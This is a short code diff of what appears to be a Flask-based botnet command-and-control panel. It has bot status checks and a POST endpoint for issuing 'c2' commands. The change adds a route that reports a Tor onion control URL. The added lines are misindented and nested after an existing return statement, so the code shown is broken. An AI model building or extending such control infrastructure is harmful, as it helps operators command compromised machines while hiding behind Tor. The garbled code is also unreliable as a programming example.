@@ -296,8 +296,15 @@ def check_bot_statuses():
 
 @app.route('/api/bots')
 def get_bots():
-    return jsonify(bots)
-
+            return jsonify(bots)
+    
+    @app.route('/api/nodes')
+    def get_nodes():
+        control_url = get_control_url()
+        if control_url:
+            return jsonify([{'onion_url': control_url, 'status': 'green'}])
+        else:
+            return jsonify([])
 @app.route('/api/c2/command', methods=['POST'])
 def issue_c2_command():
     data = request.json
